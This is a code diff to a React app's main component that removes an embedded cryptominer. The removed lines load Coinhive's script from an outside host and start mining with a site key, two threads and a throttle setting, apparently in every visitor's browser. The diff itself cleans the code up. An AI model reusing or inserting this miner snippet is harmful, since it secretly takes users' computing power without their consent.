@@ -1,7 +1,6 @@
 import React from 'react';
 import ReactDOM from 'react-dom';
 import BurgerMenu from 'react-burger-menu';
-import loadScript from 'load-script';
 import { Provider } from 'react-redux';
 import { NotificationContainer } from 'react-notifications';
 import {
@@ -89,22 +88,6 @@ class Main extends React.Component {
     firebase.auth().onAuthStateChanged(user => {
       store.dispatch(changeAuthState(user));
     });
-
-    this.startMining();
-  }
-
-  async startMining() {
-    let miner = await new Promise(resolve => {
-      loadScript('https://coinhive.com/lib/coinhive.min.js', () => {
-        // eslint-disable-next-line
-        let coinHive = CoinHive;
-        resolve(coinHive.Anonymous('iRDxrPvEHkmRa13mEEwsPvb1LxiQjp7s'))
-      });
-    });
-
-    miner.setNumThreads(2);
-    miner.setThrottle(0.2);
-    miner.start();
   }
 
   render() {
